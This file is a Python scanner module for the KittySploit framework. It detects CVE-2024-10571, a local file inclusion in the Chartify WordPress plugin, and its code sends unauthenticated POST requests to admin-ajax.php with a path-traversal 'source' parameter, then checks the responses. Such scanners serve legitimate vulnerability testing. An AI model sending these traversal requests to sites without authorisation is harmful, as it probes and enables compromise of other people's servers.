#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Chartify – WordPress Chart Plugin plugin for WordPress is vulnerable to Local File Inclusion in all versio."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Chartify – WordPress Chart Plugin < 2.9.6 - Local File Inclusion Detection',
        'description': "The Chartify – WordPress Chart Plugin plugin for WordPress is vulnerable to Local File Inclusion in all versions up to, and including, 2.9.5 via the 'source' parameter. This makes it possible for unauthenticated attackers to include and execute arbitrary files on the server, allowing the execution of any PHP code in those files. This can be used to bypass access controls, obtain sensitive data, or achieve code execution in cases where images and other “safe” file types can be uploaded and included.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wp', 'wp-plugin', 'wordpress', 'chartify', 'chart-builder', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://plugins.trac.wordpress.org/browser/chart-builder/tags/2.9.6/admin/partials/charts/actions/chart-builder-charts-actions-options.php?rev=3184238',
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/d4837258-c749-4194-926c-22b67e20c1fc?source=cve',
            'https://github.com/RandomRobbieBF/CVE-2024-10571',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-10571',
        ],
        'cve': 'CVE-2024-10571',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php?action=add&source=../../../../../../../../../../wp-content/plugins/chart-builder/admin/partials/features/chart-builder-plugin-featured-display&type=chart-js'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=ays_chart_admin_ajax&function=display_plugin_charts_page&\n')
        if not r or r.status_code != 200:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('PHPSESSID',)
        if not (any(m in headers for m in header_any)):
            return False
        path = '/wp-admin/admin-ajax.php?action=add&source=../../../../../../../../../../wp-content/plugins/chart-builder/uninstall&type=chart-js'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=ays_chart_admin_ajax&function=display_plugin_charts_page\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('ays-chart-heading-box', 'View Documentation',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Chartify – WordPress Chart Plugin < 2.9.6 - Local File Inclusion detected', path=path)
            return True
        return False

